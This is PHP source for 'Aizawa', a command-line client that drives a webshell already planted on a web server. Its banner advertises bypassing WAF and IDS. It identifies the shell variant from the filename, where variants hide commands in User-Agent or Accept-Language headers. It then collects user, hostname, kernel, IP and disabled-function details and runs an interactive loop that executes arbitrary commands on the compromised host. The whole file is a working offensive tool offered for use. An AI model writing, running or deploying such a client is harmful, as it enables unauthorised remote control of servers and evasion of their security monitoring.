<?php
//--------------------------------------------------//
//                                                  //
//                  A I Z A W A                     //
//                                                  //
// Simple command Line webshell by @elliottophellia //
//                                                  //
// Usage : aizawa.php [url]                         //
//                                                  //
//--------------------------------------------------//
//         Remove Useless Error Messages            //
//--------------------------------------------------//
error_reporting(0);
//--------------------------------------------------//
//                   Color                          //
//--------------------------------------------------//
$bold = "\033[1m";    $red = "\033[31m";
$clear = "\033[0m";   $cyan = "\033[36m";
$blue = "\033[34m";   $purple = "\033[35m";
$green = "\033[32m";  $yellow = "\033[33m";
//--------------------------------------------------//
//                  Functions                       //
//--------------------------------------------------//
require 'function.php';
//--------------------------------------------------//
//                User-Agent                        //
//--------------------------------------------------//
$user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36';
//--------------------------------------------------//
//              Display Banner                      //
//--------------------------------------------------//
print "$GLOBALS[yellow]
   ___   ________  ___ _      _____ 
  / _ | /  _/_  / / _ | | /| / / _ |
 / __ |_/ /  / /_$GLOBALS[blue]/ __ | |/ |/ / __ |
/_/ |_/___/ /___/_/ |_|__/|__/_/ |_|$GLOBALS[clear]
A Super Simple Command Line Webshell
For Bypassing Any Kind of WAF or IDS
Code by $GLOBALS[bold]@$GLOBALS[red]elliottophellia$GLOBALS[clear]    $GLOBALS[bold]#$GLOBALS[red]V$GLOBALS[purple]S$GLOBALS[blue]P$GLOBALS[yellow]O$GLOBALS[clear]Fan
";
//--------------------------------------------------//
//              Check for URL                       //
//--------------------------------------------------//
$url = $argv[1] ?? readline("Webshell URL: ");
if (filter_var($url, FILTER_VALIDATE_URL) === FALSE) {
    print "
$GLOBALS[bold]$GLOBALS[red]WARNING!$GLOBALS[clear]
This does not appear to be a valid Aizawa webshell
Please check the URL and dont change the filename
";
    exit;
}
$remove_cmd = preg_match('/^.*(?:\.)[a-zA-Z]+/m', $url, $matches);
$url = $matches[0];
//--------------------------------------------------//
//       Check if URL http request is 200           //
//--------------------------------------------------//
if (execute($url, '', 'get')[1] != 200) {
    print "
$GLOBALS[bold]$GLOBALS[red]WARNING!$GLOBALS[clear]
This does not appear to be a valid Aizawa webshell
Please check the URL and dont change the filename
";
    exit;
}
//--------------------------------------------------//
//              Check for Type                      //
//--------------------------------------------------//
$filename = substr($url, strrpos($url, '/') + 1);
$hua = preg_match('/get_aizawa_hua_(.*)\.php/', $filename, $hua);
$hal = preg_match('/get_aizawa_hal_(.*)\.php/', $filename, $hal);
$hua1 = preg_match('/post_aizawa_hua_(.*)\.php/', $filename, $hua1);
$hal1 = preg_match('/post_aizawa_hal_(.*)\.php/', $filename, $hal1);
$ninja = preg_match('/aizawa_ninja_(.*)\.php/', $filename, $ninja);
if ($hua) {
    $type = "http_user_agent_get";
} elseif ($hal) {
    $type = "http_accept_language_get";
} elseif ($hua1) {
    $type = "http_user_agent_post";
} elseif ($hal1) {
    $type = "http_accept_language_post";
} elseif ($ninja) {
    $type = "http_aizawa_ninja";
} else {
    print "
$GLOBALS[bold]$GLOBALS[red]WARNING!$GLOBALS[clear]
This does not appear to be a valid Aizawa webshell
Please check the URL and dont change the filename
";
    exit;
}
//--------------------------------------------------//
//              Check for User                      //
//--------------------------------------------------//
$user = execute($url, "whoami", $type);
$user = preg_replace('/\s+/', '', (string) $user);
$user = empty($user) ? "aizawaema" : $user;
//--------------------------------------------------//
//              Check for Host                      //
//--------------------------------------------------//
$hostname = execute($url, "hostname", $type);
$hostname = preg_replace('/\s+/', '', (string) $hostname);
$hostname = empty($hostname) ? "virtualesport" : $hostname;
//--------------------------------------------------//
//              Server information                  //
//--------------------------------------------------//
if ($ninja) {
    print "
$GLOBALS[green]Successfully connected to Aizawa Webshell Ninja Edition!$GLOBALS[clear]

";
} else {
    if ($hua1 || $hal1) {
        $disablefunc = execute($url, "disable_functions", "post");
        $safemode = execute($url, "safe_mode", "post");
        $kernel = execute($url, "unamea", "post");
        $server = execute($url, "server", "post");
        $sip = execute($url, "server_ip", "post");
        $cip = execute($url, "client_ip", "post");
    } else {
        $disablefunc = execute($url , "?disable_functions", "get")[0];
        $safemode = execute($url , "?safe_mode", "get")[0];
        $kernel = execute($url , "?unamea", "get")[0];
        $server = execute($url , "?server", "get")[0];
        $sip = execute($url , "?server_ip", "get")[0];
        $cip = execute($url , "?client_ip", "get")[0];
    }
    $disablefunc = $disablefunc == "NONE" ? $GLOBALS["green"] . $disablefunc . $GLOBALS["clear"] : $GLOBALS["red"] . $disablefunc . $GLOBALS["clear"];
    $safemode = $safemode == "ON" ? $GLOBALS["red"] . $safemode . $GLOBALS["clear"] : $GLOBALS["green"] . $safemode . $GLOBALS["clear"];
    $kernel = empty($kernel) ? $GLOBALS["red"] . "EROR" . $GLOBALS["clear"] : $GLOBALS["green"] . $kernel . $GLOBALS["clear"];
    $server = empty($server) ? $GLOBALS["red"] . "EROR" . $GLOBALS["clear"] : $GLOBALS["green"] . $server . $GLOBALS["clear"];
    $sip = empty($sip) ? $GLOBALS["red"] . "EROR" . $GLOBALS["clear"] : $GLOBALS["green"] . $sip . $GLOBALS["clear"];
    $cip = empty($cip) ? $GLOBALS["red"] . "EROR" . $GLOBALS["clear"] : $GLOBALS["green"] . $cip . $GLOBALS["clear"];
    print "
Kernel       :  $kernel 
Server       :  $server 
Safe Mode    :  $safemode
Server IP    :  $sip   
Client IP    :  $cip  
Disable Func :  $disablefunc

";
}
//--------------------------------------------------//
//                   Shell                          //
//--------------------------------------------------//
//  Credit to https://stackoverflow.com/a/2929951   //
//--------------------------------------------------//
do {
    print $GLOBALS["yellow"] . $user . $GLOBALS["clear"] . "@" . $GLOBALS["blue"] . $hostname . $GLOBALS["clear"] . ":~" . $GLOBALS["bold"] . "$ " . $GLOBALS["clear"];
    $cmd = trim((readline()));
    readline_add_history($cmd);
    switch ($cmd) {
        case 'exit':
            break;
        default:
            print "\n" . $GLOBALS["cyan"] . execute($url, $cmd, $type) . $GLOBALS["clear"] . "\n";
    }
} while ($cmd != 'exit');
